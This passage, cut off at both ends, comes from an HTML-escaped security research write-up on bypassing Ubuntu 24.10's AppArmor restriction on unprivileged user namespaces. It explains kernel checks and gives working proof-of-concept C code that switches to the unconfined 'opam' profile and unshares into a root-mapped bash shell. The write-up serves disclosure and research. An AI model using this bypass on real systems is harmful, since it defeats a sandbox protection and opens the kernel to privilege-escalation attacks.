        &lt;span class=&quot;n&quot;&gt;aa_set_current_onexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [13]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In a nut shell, if the target file being written to is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/exec&lt;/code&gt; and the data is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;exec &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;, the new profile is applied only after the &lt;strong&gt;process executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_execve&lt;/code&gt; system call&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Conversely, if writing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/current&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;changeprofile &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;, the process’s profile is &lt;strong&gt;updated immediately&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;4-out-of-the-sandbox&quot;&gt;4. Out of the Sandbox&lt;/h2&gt;

&lt;p&gt;Let’s look back at the checks in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first check examines whether the profile is in unconfined status [1], which can also be bypassed by applying a profile in &lt;strong&gt;complain mode&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The second check verifies whether the current profile is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile [2]. Therefore, using a &lt;strong&gt;non-default profile&lt;/strong&gt; can bypass this check.&lt;/p&gt;

&lt;p&gt;In short, under the current mechanism, simply &lt;strong&gt;applying any profile in unconfined status&lt;/strong&gt; allows bypassing the check to create an unprivileged user namespace!&lt;/p&gt;

&lt;h2 id=&quot;5-proof-of-concept&quot;&gt;5. Proof-Of-Concept&lt;/h2&gt;

&lt;p&gt;To bypass the restriction, you just need to switch the process’s profile from the default one to another that is in unconfined status. We chose the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opam&lt;/code&gt; profile simply because it is one of the simplest profiles. Its content is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# This profile allows everything and only exists to give the
# application a name instead of having the label &quot;unconfined&quot;

abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile opam /usr/bin/opam flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/opam&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following example code uses two methods to create an unprivileged user namespace on Ubuntu 24.10. The tested version is Ubuntu 24.10 (6.11.0-14-generic), and the test date is February 17, 2025.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _GNU_SOURCE
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sched.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unshare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLONE_NEWNET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLONE_NEWUSER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
